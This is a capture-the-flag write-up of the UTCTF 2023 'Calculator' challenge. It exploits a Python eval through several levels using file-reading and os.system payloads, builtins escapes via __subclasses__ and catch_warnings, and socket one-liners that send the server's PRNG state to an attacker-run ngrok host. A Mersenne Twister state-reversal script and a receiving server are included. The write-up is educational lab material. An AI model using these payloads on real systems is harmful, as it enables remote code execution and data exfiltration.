# Cracking the Random - UTCTF 2023 - Unintended Solution

![](https://i.imgur.com/L0ILszE.png)

[UTCTF](https://www.isss.io/utctf/) is maintained by the **Information & Systems Security Society** at the University of Texas at Austin. 

Since I'm not a Python Jail Houdini like [Alisson](https://fireshellsecurity.team/infektion/), my solution was WAY, WAY harder than most (or all) teams.
But since it was an unintended solution and I learnt a lot in the process, it was worth it.

## Challenge: Calculator

### Recon

![](https://i.imgur.com/bozVe2q.png)

Yes, 77 solves, but since it's a fun different path, it deserves the writeup.

The challenge is a number guessing game, where the right guess give you the password for the next level. The range of possible numbers is big, so you won't really make the right guess (or maybe you're a prophet, who knows?).

![](https://i.imgur.com/eOxoCAK.png)

It's a simple form with a post to the server, no javascript involved. The guessing process is all done on the server side and the challenge is blind, without the server source-code.

```html
<form method="post" action="#level-0">
  <input type="text" name="expression" />
  <input type="submit" value="Run" />
  <input type="hidden" name="type" value="calculate" />
  <input type="hidden" name="level" value="0" />
</form>
```

It says `It'll even do math for you!`. Let's try it.

![](https://i.imgur.com/mO3u94F.png)

It works! It EVALuates the expression (spoiler-alert).

Now let's touch the app with the evil hand, trying to force an exception with a possibly wrong expression.

![](https://i.imgur.com/g2dcDIN.png)

Gotcha!

```python
result = eval(answer)
```

### Level 0

Since we can just send a string to `eval`, the RCE is just automatic.
Let's try getting the source-code (we know the file name by the previous exception):

```python
open('./problem.py').read()
```

And we get [problem.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/problem.py).

```python
import random
password = open("password.txt").read()
solution = random.getrandbits(32)

answer = input()
result = eval(answer)

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")
```

There is a password to unlock the next level, let's try getting the password file.

```python
open("password.txt").read()
```

And..

```Result: PuXqj7n4WNZzStnWbtPv.  The correct answer was 4045986092.```

Let's try it:

![](https://i.imgur.com/fZ73o2e.png)

That was easy. Bring more.
 
### Level 1

Let's start trying the same.

```python
open('./problem.py').read()
```

Not that good result.

```
Traceback (most recent call last):
  File "problem.py", line 7, in <module>
    result = eval(answer, {"open": None})
  File "<string>", line 1, in <module>
TypeError: 'NoneType' object is not callable
```

It blocked the `open` function. Can't directly open the source or the password file... can't we?

Let's try a shell RCE. Since we can't do multiline statements - like `import os` and `os.system("cmd")` - in the `eval` call, we can import using a builtin function and then call it.

```python
__import__("os").system("cat password.txt")
```

```Krdi9yQuY8mHoteZDCF5Result: 0.  The correct answer was 1615348051.```

Let's try to check-in to the next level with it.

```Unlocked level 2```

Next!

### Level 2

Let's start with the previous payload.

```cat: password.txt: No such file or directory```

OK, we still have the RCE with the same payload, but there is no password file. Let's check the source code of level 2.

```python
__import__("os").system("cat problem.py")
```

Resulting in [problem2.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/problem2.py):

```python
import random, os
password = open("password.txt").read()
os.remove("password.txt") # No more reading the file!

solution = random.getrandbits(32)

answer = input()
result = eval(answer, {})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
else:
    print(f"Result: {result}.  The correct answer was {solution}.")
```

Now we are a little bit more restricted in the eval, but we have a bigger problem: the password file is just being deleted!

The information is in the `password` variable, but there is no file to read it.

We have (possibly) two options to get the correct result here:

1. Access the password variable
2. "Guess" the correct random number.

Since we can't access the caller variables from the eval scope (more on that later!), I went to the second option, which is the unintended solution :S

I knew it is possible to predict the next random values in some scenarios, but getting previous random values is a different species.

The algorithm for the `random` module in Python is called [`Mersenne Twister`](https://en.wikipedia.org/wiki/Mersenne_Twister), with is a [pseudorandom number generator (PRNG)](https://en.wikipedia.org/wiki/Pseudorandom_number_generator), but it is not a Cryptographically Secure PRNG.

While searching for this, I came up with this EXCELENT [series of articles](https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html) on cracking random values, by this beast crypto-hacker called [James Roper](https://jazzy.id.au/).

It turns out, the `Mersenne Twister` is based on a state, formed by 614 32-bit numbers. The `random` module allows you to get the current state. Let's try it:

```python
import random
random.getrandbits(32)
1273474650

random.getstate()
(3, (2494642692, 1550483902, 881532875, ..., 705994986, 3574982157, 1), None)
```

The function returns a tuple with 3 values and the middle value is the state. It also has a number in the end - `1` in this case. I didn't learn what this number means, but it was either `1` or `614`. That is enough.

Let's check if we can get the server state.

```python
__import__('random').getstate()
```

![](https://i.imgur.com/ojE7W2q.png)

OK, I'm convinced.

The article have an algorithm that, in theory, can reverse the random state to the previous one. If we can calculate the previous state and set it again - using `random.setstate()` - we can generate the same random value again!

Let's translate the article algorithm to Python and make a PoC:

```python
import random

# Get the state before the random
_, first_state, _ = random.getstate()

# Get the solution random value
solution = random.getrandbits(32)

# Get the state after the random
first, current_state, last = random.getstate()

# Turn the state into a list, to work on it
new_state = list(current_state)

# Last was the constant number (1 or 624)
new_state[-1] = 624

# https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html
for i in reversed(range(624)):
    result = 0
    tmp = new_state[i]
    tmp = tmp ^ new_state[(i + 397) % 624]

    if ((tmp & 0x80000000) == 0x80000000):
        tmp = tmp ^ 0x9908b0df

    result = (tmp << 1) & 0x80000000
    tmp = new_state[(i - 1 + 624) % 624]
    tmp = tmp ^ new_state[(i + 396) % 624]

    if ((tmp & 0x80000000) == 0x80000000):
        tmp = tmp ^ 0x9908b0df
        result = result | 1

    result = result | ( (tmp << 1) & 0x7fffffff )
    new_state[i] = result

# First value is always a constant
# Binary 10000000000000000000000000000000
new_state[i] = 2147483648

# Compare the states
print(new_state == list(first_state))

complete_target_state = (3, tuple(new_state), None)
random.setstate(complete_target_state)

cracked_solution = random.getrandbits(32)

print(f'Solution        : {solution}')
print(f'Cracked Solution: {cracked_solution}')
```

Resulting in [poc_crack_rand.py](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/poc_crack_rand.py):

```
True
Solution        : 1920796803
Cracked Solution: 1920796803
```

It works! All the crypto-credits to James Roper. I just used his algorithm.

But now we need to to this in our VERY LIMITED `eval` command. it is probably possible, but I tought it would be easier to send the state to a server controlled by me, to calculate the answer remotely and just send the result back.

If the result of the eval is the same "random" number, it will display the password.

Remember:

```python
# ...
solution = random.getrandbits(32)
# ...
result = eval(answer, {})

if result == solution:
    print(f"{result}, correct!  The password is '{password}'.")
# ...
```

Socket operations are multiline, which seems like a limit in our `eval`, but we can just call different commands and simulate local variables with a [list comprehension](https://www.w3schools.com/python/python_lists_comprehension.asp).

Let's spawn an ngrok session with a netcat backend to try receiving the server random state.

```
nc -lnvp 7777
Listening on 0.0.0.0 7777
```

Send some random payload through the socket.

```python
[[x.connect(('2.tcp.ngrok.io', 19801)), x.send(b'a'*100), x.close()] for x in [__import__('socket').socket()]]
```

And our netcat receives a knock in the door:

```
Connection received on 127.0.0.1 34756
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

OK, let's do it again, but with the random state of the server:

```python
[[x.connect(('0.tcp.ngrok.io', 12851)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20)] for x in [__import__('socket').socket()]]
```

which pings our netcat:

```
Connection received on 127.0.0.1 58092
(3, (3124877765, 267264362, 3570554370, 1064243459, 1732759887, 1732358228, 2719541217, 2504092942, 1438060417, 3270814677, 1986441919, 2698534769, 344725754, 3904667424, 2469278522, ...
```

OK, now we can crack the state and just send the correct guess back to our eval RCE.

Run the [Cracking Server](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/cracking_server.py), a socket app to receive the state and crack it:

```python
import random
import socket

def str_to_state(state_str):
    return eval(state_str, {})

# https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html
def get_last_state(current_state):
    new_state = list(current_state)
    new_state[-1] = 624

    for i in reversed(range(624)):
        result = 0
        tmp = new_state[i]
        tmp = tmp ^ new_state[(i + 397) % 624]

        if ((tmp & 0x80000000) == 0x80000000):
            tmp = tmp ^ 0x9908b0df

        result = (tmp << 1) & 0x80000000
        tmp = new_state[(i - 1 + 624) % 624]
        tmp = tmp ^ new_state[(i + 396) % 624]

        if ((tmp & 0x80000000) == 0x80000000):
            tmp = tmp ^ 0x9908b0df
            result = result | 1

        result = result | ( (tmp << 1) & 0x7fffffff )
        new_state[i] = result

    new_state[i] = 2147483648 # constant

    return new_state

def reverse_random_state(current_state_str):
    _, current_state, _ = str_to_state(current_state_str)
    last_state = get_last_state(current_state)
    complete_target_state = (3, tuple(last_state), None)
    random.setstate(complete_target_state)

# https://www.digitalocean.com/community/tutorials/python-socket-programming-server-client
def server_program():

    remote_random_state = ''

    # get the hostname
    host = '0.0.0.0' #socket.gethostname()
    port = 7777 # initiate port no above 1024

    server_socket = socket.socket()  # get instance
    # look closely. The bind() function takes tuple as argument
    server_socket.bind((host, port))  # bind host address and port together

    # configure how many client the server can listen simultaneously
    server_socket.listen(2)
    conn, address = server_socket.accept()  # accept new connection
    print("Connection from: " + str(address))
    while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
        data = conn.recv(1024 * 100).decode()
        print("from connected user: " + str(data))
        print("\n"*5)
        if not data:
            # if data is not received break
            break
        remote_random_state += str(data).strip()

        if remote_random_state.find('), None)') >= 0:
            reverse_random_state(remote_random_state)
            answer = str(random.getrandbits(32))
            # send cracked random to the client
            conn.send(answer.encode())
            break        

    conn.close()  # close the connection
    server_socket.close()

if __name__ == '__main__':
    server_program()
```

In the eval payload, we have to also process the response from the random, to make it an int:

```python
int([[x.connect(('8.tcp.ngrok.io', 15754)), x.send(bytes(str(__import__('random').getstate()), 'UTF-8')), x.recv(20), x.close()] for x in [__import__('socket').socket()]][0][2])
```

And, let's run our [Exploit](https://github.com/Neptunians/utcft-2023-writeup-calculator/blob/main/exploit.py) to make the attack easier.

And we finally receive the prize:
`1364310140, correct!  The password is &#x27;E46Dnqb5enAMgGArbruu&#x27;`

Password: `E46Dnqb5enAMgGArbruu`

### Level 3

Let's just try the same payload, off-course.

![](https://i.imgur.com/dOptwVG.png)

Now it also blocks our built-in functions, like `int` and `__import__`.
It is now like a standard SSTI challenge. We can get the classes and builtins we need from the primitive types, like `tuple` and `str`.

Let's check our available classes on the server:

```python
().__class__.__base__.__subclasses__()
```

![](https://i.imgur.com/GgmDtVi.png)

A lot of stuff. The interesting class here is the `warnings.catch_warnings`. It allows us to get to the builtins.

Let's try a simple RCE.

```python
{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['int']("12")
```

And...

`Result: 12.  The correct answer was 2743938107.`

OK, we're in again.

Let's adapt our payload from level 2 to the new world order.

```python
{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['int']([[x.connect(('2.tcp.ngrok.io', 10157)), x.send({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['bytes']({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['str']({x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['__import__']('random').getstate()), 'UTF-8')), x.recv(20)] for x in [{x.__name__: x for x in ().__class__.__base__.__subclasses__()}['catch_warnings']()._module.__builtins__['__import__']('socket').socket()]][0][2])
```

(It could be more readable, by making the builtins into a string variable here but... feel the vibe!)

![](https://i.imgur.com/8YZuPMA.png)

`utflag{LGvb7PJXG5JDwhsEW7xp}`

## The intended solution

After my Around the World in 80 days solution, the CTF ended and I went too see the other solutions. There were 70 solves!
I obviously didn't see the simpler solutions.

`bawolff#3779` sent that:

```python
[x for x in ().__class__.__base__.__subclasses__() if x.__name__ == "catch_warnings"][0]()._module.sys._getframe(1).f_locals["password"]
```

That's it. `sys._getframe(1).f_locals` to get local variables from the caller `(dumb me)`.

And there was another, even simpler, approach, from `bliutech#7756`.

```python
__import__('__main__').password
```

`(dumb me)^2`

But it was so fun...

## Preventing

If you need to evaluate code from the client, is hard to guarantee safety. Python might not be the best choice. Maybe JavaScript? Can you do it without running client-controlled code on the server?

If you really need it, you should look for safer, sandboxed solutions.

I'm sure I'm forgetting other important protections here. Send me hints for better security on [Twitter](https://twitter.com/NeptunianHacks).


## References
* Team: [FireShell](https://fireshellsecurity.team/)
* [Team Twitter](https://twitter.com/fireshellst)
* Follow me too :) [@NeptunianHacks](https://twitter.com/NeptunianHacks) 
* [Github Repo with artifacts discussed here](https://github.com/Neptunians/utcft-2023-writeup-calculator)
* [CTF Time Event](https://ctftime.org/event/1919)
* [Mersenne Twister](https://en.wikipedia.org/wiki/Mersenne_Twister)
* [pseudorandom number generator (PRNG)](https://en.wikipedia.org/wiki/Pseudorandom_number_generator)
* [Cracking Random Number Generators - Part 4](https://jazzy.id.au/2010/09/25/cracking_random_number_generators_part_4.html)
* [Hacktricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti)
* [Python Socket Programming - Server, Client Example](https://www.digitalocean.com/community/tutorials/python-socket-programming-server-client)
* [ngrok](https://ngrok.com/)